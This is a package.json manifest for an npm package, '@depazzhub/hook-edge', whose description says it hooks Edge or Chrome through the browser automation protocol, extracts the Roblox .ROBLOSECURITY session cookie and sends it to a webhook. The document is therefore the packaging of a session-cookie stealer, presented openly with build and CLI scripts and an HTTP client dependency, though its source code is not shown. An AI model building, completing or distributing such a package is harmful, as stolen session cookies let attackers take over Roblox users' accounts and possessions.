{
  "name": "@depazzhub/hook-edge",
  "version": "1.0.3",
  "description": "Roblox cookie hook for Edge/Chrome using Edge Automation Protocol (CDP) — extracts .ROBLOSECURITY cookie and sends it to webhook",
  "main": "dist/index.js",
  "scripts": {
    "build": "node scripts/build.mjs",
    "pack": "node scripts/pack.mjs",
    "cli": "node dist/index.js cli"
  },
  "dependencies": {
    "@msedge/automation-protocol": "^0.4.19",
    "axios": "^1.6.2"
  }
}
